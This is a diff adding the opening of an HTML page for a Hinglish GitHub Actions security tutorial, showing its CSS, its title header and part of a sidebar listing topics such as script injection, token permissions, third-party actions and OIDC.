@@ -1,0 +1,1995 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GitHub Actions: Security Complete Guide</title>
+
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600&family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg-dark: #0b0f19;
+      --bg-panel: #0f1626;
+      --card-bg: rgba(17, 24, 39, 0.72);
+      --border-color: rgba(255, 255, 255, 0.09);
+      --primary-neon: #3b82f6;
+      --secondary-neon: #a855f7;
+      --pink-neon: #ec4899;
+      --success-neon: #10b981;
+      --warn-neon: #f59e0b;
+      --danger-neon: #ef4444;
+      --cyan-neon: #06b6d4;
+      --text-main: #f3f4f6;
+      --text-muted: #9ca3af;
+      --highlight-gradient: linear-gradient(135deg, var(--primary-neon), var(--secondary-neon));
+      --danger-gradient: linear-gradient(135deg, #ef4444, #ec4899);
+      --code-bg: #070b14;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      background-color: var(--bg-dark);
+      color: var(--text-main);
+      font-family: 'Outfit', -apple-system, BlinkMacSystemFont, sans-serif;
+      overflow-x: hidden;
+      min-height: 100vh;
+      line-height: 1.65;
+    }
+
+    /* Ambient background glows */
+    .glow-bg {
+      position: fixed;
+      top: -15%;
+      right: 5%;
+      width: 50vw;
+      height: 50vw;
+      background: radial-gradient(circle, rgba(239, 68, 68, 0.12) 0%, rgba(168, 85, 247, 0.07) 50%, transparent 100%);
+      filter: blur(90px);
+      z-index: -1;
+      pointer-events: none;
+    }
+
+    .glow-bg-2 {
+      position: fixed;
+      bottom: -10%;
+      left: -5%;
+      width: 45vw;
+      height: 45vw;
+      background: radial-gradient(circle, rgba(59, 130, 246, 0.14) 0%, rgba(236, 72, 153, 0.06) 50%, transparent 100%);
+      filter: blur(100px);
+      z-index: -1;
+      pointer-events: none;
+    }
+
+    /* Header */
+    header {
+      padding: 3.5rem 2rem 1.75rem;
+      text-align: center;
+      position: relative;
+    }
+
+    .hero-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.35rem 1rem;
+      border-radius: 999px;
+      background: rgba(239, 68, 68, 0.14);
+      border: 1px solid rgba(239, 68, 68, 0.38);
+      color: #fca5a5;
+      font-size: 0.85rem;
+      font-weight: 600;
+      letter-spacing: 0.04em;
+      margin-bottom: 1rem;
+    }
+
+    header h1 {
+      font-size: clamp(2.1rem, 4.5vw, 3.4rem);
+      font-weight: 800;
+      background: linear-gradient(to right, #ffffff, #f87171, #c084fc, #60a5fa);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 0.85rem;
+      letter-spacing: -0.03em;
+      line-height: 1.15;
+    }
+
+    header p {
+      font-size: 1.15rem;
+      color: var(--text-muted);
+      max-width: 840px;
+      margin: 0 auto;
+      font-weight: 300;
+    }
+
+    /* Main Layout */
+    .container {
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 1.5rem 2rem 4rem;
+      display: grid;
+      grid-template-columns: 295px 1fr;
+      gap: 2.5rem;
+      align-items: start;
+    }
+
+    /* Sidebar Navigation */
+    .sidebar {
+      position: sticky;
+      top: 1.5rem;
+      background: var(--card-bg);
+      backdrop-filter: blur(14px);
+      border: 1px solid var(--border-color);
+      border-radius: 18px;
+      padding: 1.35rem;
+      z-index: 10;
+      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.28);
+    }
+
+    .sidebar h3 {
+      font-size: 0.82rem;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      color: var(--text-muted);
+      margin-bottom: 1rem;
+      font-weight: 700;
+      border-bottom: 1px solid var(--border-color);
+      padding-bottom: 0.6rem;
+    }
+
+    .nav-btn {
+      display: flex;
+      align-items: center;
+      width: 100%;
+      padding: 0.8rem 0.9rem;
+      background: transparent;
+      border: 1px solid transparent;
+      color: var(--text-muted);
+      font-family: 'Outfit', sans-serif;
+      font-size: 0.94rem;
+      font-weight: 600;
+      text-align: left;
+      cursor: pointer;
+      border-radius: 10px;
+      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+      margin-bottom: 0.4rem;
+      gap: 0.7rem;
+    }
+
+    .nav-btn:hover {
+      background: rgba(255, 255, 255, 0.04);
+      color: var(--text-main);
+      transform: translateX(4px);
+    }
+
+    .nav-btn.active {
+      background: var(--highlight-gradient);
+      color: #fff;
+      box-shadow: 0 4px 18px rgba(59, 130, 246, 0.3);
+    }
+
+    .nav-btn .nav-icon {
+      font-size: 1.1rem;
+      flex-shrink: 0;
+    }
+
+    .nav-progress {
+      margin-top: 1.1rem;
+      padding-top: 1rem;
+      border-top: 1px solid var(--border-color);
+      font-size: 0.82rem;
+      color: var(--text-muted);
+    }
+
+    .progress-bar-track {
+      width: 100%;
+      height: 6px;
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 999px;
+      margin-top: 0.45rem;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 14.3%;
+      background: var(--highlight-gradient);
+      border-radius: 999px;
+      transition: width 0.35s ease;
+    }
+
+    /* Main Content */
+    .main-content {
+      min-width: 0;
+    }
+
+    .tab-content {
+      display: none;
+      animation: fadeIn 0.4s ease;
+    }
+
+    .tab-content.active {
+      display: block;
+    }
+
+    /* Cards */
+    .card {
+      background: var(--card-bg);
+      backdrop-filter: blur(14px);
+      border: 1px solid var(--border-color);
+      border-radius: 20px;
+      padding: 2.2rem;
+      margin-bottom: 1.85rem;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.25);
+      transition: border-color 0.3s;
+    }
+
+    .card:hover {
+      border-color: rgba(59, 130, 246, 0.35);
+    }
+
+    .card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 4px;
+      height: 100%;
+      background: var(--highlight-gradient);
+    }
+
+    .card.card-purple::before { background: linear-gradient(180deg, #a855f7, #ec4899); }
+    .card.card-green::before { background: linear-gradient(180deg, #10b981, #06b6d4); }
+    .card.card-amber::before { background: linear-gradient(180deg, #f59e0b, #ef4444); }
+    .card.card-red::before { background: linear-gradient(180deg, #ef4444, #ec4899); }
+    .card.card-cyan::before { background: linear-gradient(180deg, #06b6d4, #3b82f6); }
+
+    .card-title {
+      font-size: 1.6rem;
+      font-weight: 700;
+      margin-bottom: 1.15rem;
+      display: flex;
+      align-items: center;
+      gap: 0.7rem;
+      flex-wrap: wrap;
+      line-height: 1.3;
+    }
+
+    p.intro-text {
+      font-size: 1.05rem;
+      color: #d1d5db;
+      margin-bottom: 1.2rem;
+    }
+
+    p.intro-text strong {
+      color: #ffffff;
+    }
+
+    .hinglish-tag {
+      background: rgba(59, 130, 246, 0.15);
+      color: #93c5fd;
+      border: 1px solid rgba(59, 130, 246, 0.35);
+      padding: 0.22rem 0.75rem;
+      font-size: 0.76rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      border-radius: 999px;
+      display: inline-block;
+      margin-bottom: 0.85rem;
+    }
+
+    .hinglish-tag.tag-purple { background: rgba(168, 85, 247, 0.16); color: #d8b4fe; border-color: rgba(168, 85, 247, 0.38); }
+    .hinglish-tag.tag-green { background: rgba(16, 185, 129, 0.15); color: #6ee7b7; border-color: rgba(16, 185, 129, 0.35); }
+    .hinglish-tag.tag-amber { background: rgba(245, 158, 11, 0.15); color: #fcd34d; border-color: rgba(245, 158, 11, 0.35); }
+    .hinglish-tag.tag-cyan { background: rgba(6, 182, 212, 0.15); color: #67e8f9; border-color: rgba(6, 182, 212, 0.35); }
+    .hinglish-tag.tag-red { background: rgba(239, 68, 68, 0.16); color: #fca5a5; border-color: rgba(239, 68, 68, 0.4); }
+    .hinglish-tag.tag-pink { background: rgba(236, 72, 153, 0.16); color: #f9a8d4; border-color: rgba(236, 72, 153, 0.38); }
+
+    /* Inline code */
+    code {
+      font-family: 'Fira Code', monospace;
+      font-size: 0.87rem;
+      color: #c084fc;
+      background: rgba(168, 85, 247, 0.1);
+      padding: 0.12rem 0.42rem;
+      border-radius: 6px;
+      border: 1px solid rgba(168, 85, 247, 0.18);
+    }
+
+    /* Callout / Analogy Boxes */
+    .analogy-box {
+      background: rgba(59, 130, 246, 0.07);
+      border: 1px solid rgba(59, 130, 246, 0.22);
+      border-left: 4px solid var(--primary-neon);
+      padding: 1.2rem 1.4rem;
+      border-radius: 12px;
+      margin: 1.25rem 0;
+      font-size: 1rem;
+      color: #e5e7eb;
+    }
+
+    .analogy-box.warn { background: rgba(245, 158, 11, 0.08); border-color: rgba(245, 158, 11, 0.25); border-left-color: var(--warn-neon); }
+    .analogy-box.danger { background: rgba(239, 68, 68, 0.08); border-color: rgba(239, 68, 68, 0.25); border-left-color: var(--danger-neon); }
+    .analogy-box.success { background: rgba(16, 185, 129, 0.08); border-color: rgba(16, 185, 129, 0.25); border-left-color: var(--success-neon); }
+    .analogy-box.purple { background: rgba(168, 85, 247, 0.08); border-color: rgba(168, 85, 247, 0.25); border-left-color: var(--secondary-neon); }
+
+    .analogy-title {
+      font-weight: 700;
+      margin-bottom: 0.35rem;
+      display: flex;
+      align-items: center;
+      gap: 0.45rem;
+      color: #fff;
+    }
+
+    /* Code Blocks */
+    .code-wrapper {
+      background: var(--code-bg);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 14px;
+      overflow: hidden;
+      margin: 1.15rem 0;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
+    }
+
+    .code-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0.65rem 1rem;
+      background: rgba(255, 255, 255, 0.03);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.07);
+      gap: 0.75rem;
+      flex-wrap: wrap;
+    }
+
+    .code-filepath {
+      font-family: 'Fira Code', monospace;
+      font-size: 0.8rem;
+      color: #93c5fd;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .code-dots {
+      display: inline-flex;
+      gap: 5px;
+      margin-right: 0.35rem;
+    }
+    .code-dots span { width: 9px; height: 9px; border-radius: 50%; }
+    .code-dots span:nth-child(1) { background: #ef4444; }
+    .code-dots span:nth-child(2) { background: #f59e0b; }
+    .code-dots span:nth-child(3) { background: #10b981; }
+
+    .copy-btn {
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      color: #d1d5db;
+      font-family: 'Outfit', sans-serif;
+      font-size: 0.78rem;
+      font-weight: 600;
+      padding: 0.28rem 0.7rem;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .copy-btn:hover { background: rgba(59, 130, 246, 0.22); border-color: rgba(59, 130, 246, 0.5); color: #fff; }
+    .copy-btn.copied { background: rgba(16, 185, 129, 0.22); border-color: rgba(16, 185, 129, 0.5); color: #6ee7b7; }
+
+    pre {
+      padding: 1.15rem 1.25rem;
+      overflow-x: auto;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.84rem;
+      line-height: 1.65;
+      color: #e2e8f0;
+      tab-size: 2;
+    }
+
+    pre code {
+      background: none;
+      border: none;
+      padding: 0;
+      color: inherit;
+      font-size: inherit;
+    }
+
+    /* Syntax highlight spans */
+    .y-key { color: #60a5fa; }
+    .y-str { color: #34d399; }
+    .y-expr { color: #f472b6; font-weight: 500; }
+    .y-com { color: #64748b; font-style: italic; }
+    .y-num { color: #fbbf24; }
+    .y-kw { color: #c084fc; font-weight: 600; }
+    .y-fn { color: #38bdf8; }
+    .y-bad { color: #f87171; font-weight: 600; }
+
+    .y-hl { display: block; background: rgba(59, 130, 246, 0.14); margin: 0 -1.25rem; padding: 0 1.25rem; border-left: 3px solid #3b82f6; }
+    .y-hl-green { display: block; background: rgba(16, 185, 129, 0.13); margin: 0 -1.25rem; padding: 0 1.25rem; border-left: 3px solid #10b981; }
+    .y-hl-red { display: block; background: rgba(239, 68, 68, 0.15); margin: 0 -1.25rem; padding: 0 1.25rem; border-left: 3px solid #ef4444; }
+    .y-hl-amber { display: block; background: rgba(245, 158, 11, 0.13); margin: 0 -1.25rem; padding: 0 1.25rem; border-left: 3px solid #f59e0b; }
+
+    /* Pipeline Visualizer */
+    .pipeline-visual {
+      display: flex;
+      flex-direction: column;
+      gap: 0.95rem;
+      margin: 1.5rem 0;
+      position: relative;
+    }
+
+    .pipeline-step {
+      display: flex;
+      align-items: center;
+      background: rgba(255, 255, 255, 0.025);
+      border: 1px solid var(--border-color);
+      padding: 1.15rem 1.35rem;
+      border-radius: 14px;
+      position: relative;
+      transition: all 0.25s;
+      gap: 1.1rem;
+    }
+
+    .pipeline-step:hover {
+      border-color: rgba(59, 130, 246, 0.4);
+      transform: translateX(4px);
+      background: rgba(255, 255, 255, 0.04);
+    }
+
+    .pipeline-step.step-success { border-color: rgba(16, 185, 129, 0.45); background: rgba(16, 185, 129, 0.06); }
+    .pipeline-step.step-danger { border-color: rgba(239, 68, 68, 0.55); background: rgba(239, 68, 68, 0.08); }
+    .pipeline-step.step-skipped { opacity: 0.5; border-style: dashed; }
+
+    .step-number {
+      font-size: 1.2rem;
+      font-weight: 800;
+      color: #60a5fa;
+      background: rgba(59, 130, 246, 0.14);
+      border: 1px solid rgba(59, 130, 246, 0.3);
+      width: 42px;
+      height: 42px;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+    }
+
+    .step-number.purple { color: #d8b4fe; background: rgba(168, 85, 247, 0.15); border-color: rgba(168, 85, 247, 0.35); }
+    .step-number.green { color: #6ee7b7; background: rgba(16, 185, 129, 0.15); border-color: rgba(16, 185, 129, 0.35); }
+    .step-number.amber { color: #fcd34d; background: rgba(245, 158, 11, 0.15); border-color: rgba(245, 158, 11, 0.35); }
+    .step-number.red { color: #fca5a5; background: rgba(239, 68, 68, 0.18); border-color: rgba(239, 68, 68, 0.45); }
+
+    .step-details { flex: 1; min-width: 0; }
+    .step-details h4 { font-size: 1.05rem; color: var(--text-main); margin-bottom: 0.2rem; }
+    .step-details p { font-size: 0.9rem; color: var(--text-muted); }
+
+    .step-badge {
+      background: rgba(168, 85, 247, 0.15);
+      color: #d8b4fe;
+      border: 1px solid rgba(168, 85, 247, 0.32);
+      padding: 0.28rem 0.65rem;
+      font-size: 0.76rem;
+      font-family: 'Fira Code', monospace;
+      border-radius: 8px;
+      flex-shrink: 0;
+      max-width: 100%;
+      word-break: break-all;
+    }
+
+    .step-badge.green { background: rgba(16, 185, 129, 0.15); color: #6ee7b7; border-color: rgba(16, 185, 129, 0.35); }
+    .step-badge.amber { background: rgba(245, 158, 11, 0.15); color: #fcd34d; border-color: rgba(245, 158, 11, 0.35); }
+    .step-badge.red { background: rgba(239, 68, 68, 0.18); color: #fca5a5; border-color: rgba(239, 68, 68, 0.45); }
+
+    .pipeline-arrow {
+      align-self: center;
+      color: var(--text-muted);
+      font-size: 1.1rem;
+      animation: pulse 2s infinite;
+      line-height: 1;
+    }
+
+    /* Grids */
+    .grid-2 { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 1.25rem; margin: 1.25rem 0; }
+    .grid-3 { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 1.2rem; margin: 1.4rem 0; }
+
+    /* Threat Cards (Inspired by user's screenshot!) */
+    .type-card {
+      background: rgba(15, 23, 42, 0.85);
+      border: 1px solid var(--border-color);
+      border-radius: 18px;
+      padding: 1.5rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.85rem;
+      transition: transform 0.25s, border-color 0.25s, box-shadow 0.25s;
+      cursor: pointer;
+    }
+
+    .type-card:hover { transform: translateY(-5px); }
+
+    .type-card.t-inj { border-top: 4px solid #6366f1; }
+    .type-card.t-inj:hover { border-color: #818cf8; box-shadow: 0 10px 30px rgba(99, 102, 241, 0.22); }
+
+    .type-card.t-third { border-top: 4px solid #a855f7; }
+    .type-card.t-third:hover { border-color: #c084fc; box-shadow: 0 10px 30px rgba(168, 85, 247, 0.22); }
+
+    .type-card.t-perm { border-top: 4px solid #d946ef; }
+    .type-card.t-perm:hover { border-color: #e879f9; box-shadow: 0 10px 30px rgba(217, 70, 239, 0.22); }
+
+    .type-icon {
+      width: 54px;
+      height: 54px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.55rem;
+      margin-bottom: 0.2rem;
+    }
+
+    .t-inj .type-icon { background: rgba(99, 102, 241, 0.2); border: 1px solid rgba(99, 102, 241, 0.45); }
+    .t-third .type-icon { background: rgba(168, 85, 247, 0.2); border: 1px solid rgba(168, 85, 247, 0.45); }
+    .t-perm .type-icon { background: rgba(217, 70, 239, 0.2); border: 1px solid rgba(217, 70, 239, 0.45); }
+
+    .type-card h3 { font-size: 1.18rem; font-weight: 700; }
+
+    .type-pill-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+      flex: 1;
+    }
+
+    .type-pill-list li {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      padding: 0.55rem 0.75rem;
+      border-radius: 10px;
+      font-size: 0.88rem;
+      color: #d1d5db;
+    }
+
+    .type-cta {
+      margin-top: 0.35rem;
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: #93c5fd;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.35rem;
+    }
+
+    /* Mini info boxes */
+    .mini-box {
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid var(--border-color);
+      border-radius: 14px;
+      padding: 1.25rem;
+    }
+    .mini-box h4 { font-size: 1.05rem; margin-bottom: 0.5rem; color: #fff; display: flex; align-items: center; gap: 0.45rem; }
+    .mini-box p, .mini-box li { font-size: 0.92rem; color: #cbd5e1; }
+    .mini-box ul { padding-left: 1.15rem; display: flex; flex-direction: column; gap: 0.4rem; }
+
+    /* Sub-tabs */
+    .sub-tabs { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1rem; }
+    .sub-tab-btn {
+      padding: 0.55rem 1rem;
+      border-radius: 10px;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      background: rgba(255, 255, 255, 0.03);
+      color: var(--text-muted);
+      font-family: 'Fira Code', monospace;
+      font-size: 0.82rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .sub-tab-btn:hover { background: rgba(255, 255, 255, 0.08); color: #fff; }
+    .sub-tab-btn.active { background: var(--highlight-gradient); color: #fff; border-color: transparent; box-shadow: 0 4px 14px rgba(59, 130, 246, 0.3); }
+
+    .sub-panel { display: none; animation: fadeIn 0.3s ease; }
+    .sub-panel.active { display: block; }
+
+    /* Simulator Panel */
+    .sim-box {
+      background: rgba(7, 11, 20, 0.88);
+      border: 1px solid rgba(59, 130, 246, 0.3);
+      border-radius: 16px;
+      padding: 1.5rem;
+      margin: 1.35rem 0;
+    }
+
+    .sim-controls {
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
+      align-items: center;
+      margin-bottom: 1.2rem;
+      padding-bottom: 1rem;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .sim-group { display: flex; align-items: center; gap: 0.5rem; flex-wrap: wrap; }
+    .sim-label { font-size: 0.88rem; font-weight: 600; color: #cbd5e1; }
+
+    .sim-toggle {
+      padding: 0.42rem 0.85rem;
+      border-radius: 8px;
+      border: 1px solid rgba(255, 255, 255, 0.14);
+      background: rgba(255, 255, 255, 0.04);
+      color: #9ca3af;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.8rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .sim-toggle:hover { color: #fff; border-color: rgba(255, 255, 255, 0.3); }
+    .sim-toggle.active { background: rgba(59, 130, 246, 0.25); border-color: #60a5fa; color: #fff; }
+    .sim-toggle.active-green { background: rgba(16, 185, 129, 0.25); border-color: #34d399; color: #6ee7b7; }
+    .sim-toggle.active-red { background: rgba(239, 68, 68, 0.25); border-color: #f87171; color: #fecaca; }
+    .sim-toggle.active-amber { background: rgba(245, 158, 11, 0.22); border-color: #fbbf24; color: #fde68a; }
+
+    .sim-input {
+      width: 100%;
+      padding: 0.72rem 1rem;
+      border-radius: 10px;
+      border: 1px solid rgba(168, 85, 247, 0.4);
+      background: #04070d;
+      color: #f8fafc;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.88rem;
+      outline: none;
+      margin-bottom: 0.85rem;
+    }
+    .sim-input:focus { border-color: #60a5fa; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2); }
+
+    .sim-terminal {
+      background: #04070d;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 10px;
+      padding: 1rem 1.2rem;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.82rem;
+      line-height: 1.72;
+      color: #94a3b8;
+      margin-top: 1rem;
+      overflow-x: auto;
+    }
+
+    .term-green { color: #34d399; }
+    .term-blue { color: #60a5fa; }
+    .term-amber { color: #fbbf24; }
+    .term-pink { color: #f472b6; }
+    .term-red { color: #f87171; font-weight: 600; }
+
+    /* Folder Tree */
+    .folder-tree {
+      background: var(--code-bg);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 14px;
+      padding: 1.25rem 1.5rem;
+      font-family: 'Fira Code', monospace;
+      font-size: 0.84rem;
+      line-height: 1.85;
+      white-space: pre;
+      overflow-x: auto;
+    }
+    .tree-dir { color: #60a5fa; font-weight: 600; }
+    .tree-file { color: #e2e8f0; }
+    .tree-tag {
+      display: inline-block;
+      margin-left: 0.6rem;
+      padding: 0.08rem 0.5rem;
+      border-radius: 6px;
+      font-size: 0.72rem;
+      font-family: 'Outfit', sans-serif;
+      font-weight: 600;
+    }
+    .tree-tag.t-red { background: rgba(239, 68, 68, 0.2); color: #fca5a5; }
+    .tree-tag.t-green { background: rgba(16, 185, 129, 0.2); color: #6ee7b7; }
+
+    /* Table */
+    .table-wrap { overflow-x: auto; border-radius: 14px; border: 1px solid var(--border-color); margin: 1.25rem 0; }
+    table { width: 100%; border-collapse: collapse; font-size: 0.92rem; }
+    th, td { padding: 0.9rem 1rem; text-align: left; border-bottom: 1px solid rgba(255, 255, 255, 0.06); vertical-align: top; }
+    th { background: rgba(59, 130, 246, 0.12); color: #fff; font-weight: 700; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.04em; }
+    tr:last-child td { border-bottom: none; }
+    tr:hover td { background: rgba(255, 255, 255, 0.02); }
+
+    /* Explain List */
+    .explain-list { display: flex; flex-direction: column; gap: 0.7rem; margin: 1rem 0; }
+    .explain-item {
+      display: flex;
+      gap: 0.85rem;
+      align-items: flex-start;
+      background: rgba(255, 255, 255, 0.025);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      padding: 0.85rem 1rem;
+      border-radius: 12px;
+    }
+    .line-pill {
+      font-family: 'Fira Code', monospace;
+      font-size: 0.76rem;
+      font-weight: 600;
+      color: #93c5fd;
+      background: rgba(59, 130, 246, 0.15);
+      border: 1px solid rgba(59, 130, 246, 0.3);
+      padding: 0.18rem 0.55rem;
+      border-radius: 6px;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+    .line-pill.red { color: #fca5a5; background: rgba(239, 68, 68, 0.16); border-color: rgba(239, 68, 68, 0.38); }
+    .line-pill.green { color: #6ee7b7; background: rgba(16, 185, 129, 0.16); border-color: rgba(16, 185, 129, 0.38); }
+    .explain-item p { font-size: 0.93rem; color: #d1d5db; }
+
+    /* Architecture Diagram */
+    .arch-diagram { display: grid; grid-template-columns: 1fr auto 1fr; gap: 1rem; align-items: center; margin: 1.4rem 0; }
+    .arch-box { background: rgba(15, 23, 42, 0.9); border: 1px solid rgba(59, 130, 246, 0.35); border-radius: 14px; padding: 1.2rem; }
+    .arch-box.aws-box { border-color: rgba(245, 158, 11, 0.45); background: rgba(245, 158, 11, 0.06); }
+    .arch-box h4 { font-size: 0.98rem; margin-bottom: 0.65rem; color: #fff; }
+    .arch-item { background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.07); padding: 0.48rem 0.7rem; border-radius: 8px; font-family: 'Fira Code', monospace; font-size: 0.78rem; margin-bottom: 0.45rem; color: #e2e8f0; }
+    .arch-bridge { text-align: center; font-size: 0.78rem; color: #67e8f9; font-weight: 700; padding: 0.5rem; }
+
+    /* Quiz */
+    .quiz-card { background: rgba(255, 255, 255, 0.025); border: 1px solid var(--border-color); border-radius: 14px; padding: 1.35rem; margin-bottom: 1rem; }
+    .quiz-q { font-size: 1.02rem; font-weight: 600; color: #fff; margin-bottom: 0.85rem; }
+    .quiz-opts { display: grid; grid-template-columns: repeat(auto-fit, minmax(210px, 1fr)); gap: 0.6rem; }
+    .quiz-opt {
+      padding: 0.7rem 0.9rem;
+      border-radius: 10px;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      background: rgba(255, 255, 255, 0.03);
+      color: #d1d5db;
+      font-family: 'Outfit', sans-serif;
+      font-size: 0.9rem;
+      font-weight: 500;
+      text-align: left;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .quiz-opt:hover { background: rgba(59, 130, 246, 0.14); border-color: rgba(59, 130, 246, 0.45); color: #fff; }
+    .quiz-opt.correct { background: rgba(16, 185, 129, 0.2); border-color: #10b981; color: #6ee7b7; font-weight: 700; }
+    .quiz-opt.wrong { background: rgba(239, 68, 68, 0.18); border-color: #ef4444; color: #fca5a5; }
+    .quiz-feedback { margin-top: 0.75rem; font-size: 0.9rem; padding: 0.7rem 0.95rem; border-radius: 10px; display: none; }
+    .quiz-feedback.show { display: block; }
+    .quiz-feedback.ok { background: rgba(16, 185, 129, 0.12); color: #a7f3d0; border: 1px solid rgba(16, 185, 129, 0.3); }
+    .quiz-feedback.no { background: rgba(239, 68, 68, 0.12); color: #fecaca; border: 1px solid rgba(239, 68, 68, 0.3); }
+
+    /* Interactive Checklist */
+    .check-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.75rem;
+      padding: 0.75rem 1rem;
+      background: rgba(255, 255, 255, 0.025);
+      border: 1px solid rgba(255, 255, 255, 0.07);
+      border-radius: 10px;
+      margin-bottom: 0.55rem;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .check-item:hover { background: rgba(255, 255, 255, 0.05); }
+    .check-item input { margin-top: 4px; accent-color: #10b981; width: 17px; height: 17px; cursor: pointer; }
+    .check-item.checked { border-color: rgba(16, 185, 129, 0.4); background: rgba(16, 185, 129, 0.07); }
+
+    /* Bottom Next/Prev Navigation */
+    .section-footer-nav { display: flex; justify-content: space-between; align-items: center; margin-top: 1.5rem; gap: 1rem; flex-wrap: wrap; }
+    .pager-btn {
+      padding: 0.8rem 1.35rem;
+      border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.14);
+      background: rgba(255, 255, 255, 0.04);
+      color: #fff;
+      font-family: 'Outfit', sans-serif;
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.25s;
+    }
+    .pager-btn:hover { background: rgba(59, 130, 246, 0.2); border-color: rgba(59, 130, 246, 0.5); transform: translateY(-2px); }
+    .pager-btn.primary { background: var(--highlight-gradient); border-color: transparent; box-shadow: 0 4px 18px rgba(59, 130, 246, 0.3); }
+
+    @keyframes pulse {
+      0% { opacity: 0.35; transform: translateY(0); }
+      50% { opacity: 1; transform: translateY(3px); }
+      100% { opacity: 0.35; transform: translateY(0); }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @media (max-width: 980px) {
+      .container { grid-template-columns: 1fr; padding: 1rem 1.2rem 3rem; }
+      .sidebar { position: static; }
+      .grid-3, .grid-2, .arch-diagram { grid-template-columns: 1fr; }
+      .card { padding: 1.5rem; }
+      .pipeline-step { flex-direction: column; align-items: flex-start; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="glow-bg"></div>
+  <div class="glow-bg-2"></div>
+
+  <header>
+    <div class="hero-pill">🛡️ Section 09 · Zero-Video-Needed Complete Mastery</div>
+    <h1>GitHub Actions: Security Master Guide</h1>
+    <p>Script Injection se lekar <code>GITHUB_TOKEN</code> Permissions, Malicious Third-Party Actions, Commit SHA Pinning aur OIDC tak — live Hacker vs Defense simulators aur tumhare exact project code ke saath!</p>
+  </header>
+
+  <div class="container">
+    <!-- Sidebar Navigation -->
+    <aside class="sidebar">
+      <h3>Security Roadmap</h3>
+      <button class="nav-btn active" data-tab="big-picture" onclick="switchTab('big-picture')">
+        <span class="nav-icon">🛡️</span> 1. Risk Kya Hai? (3 Pillars)
+      </button>
+      <button class="nav-btn" data-tab="script-injection" onclick="switchTab('script-injection')">
+        <span class="nav-icon">💉</span> 2. Script Injection + Lab
+      </button>
+      <button class="nav-btn" data-tab="permissions" onclick="switchTab('permissions')">
+        <span class="nav-icon">🔑</span> 3. GITHUB_TOKEN &amp; Permissions
+      </button>
+      <button class="nav-btn" data-tab="third-party" onclick="switchTab('third-party')">
+        <span class="nav-icon">🎬</span> 4. Malicious 3rd-Party Actions
+      </button>
+      <button class="nav-btn" data-tab="oidc-secrets" onclick="switchTab('oidc-secrets')">
+        <span class="nav-icon">🔐</span> 5. OpenID Connect (OIDC)
+      </button>
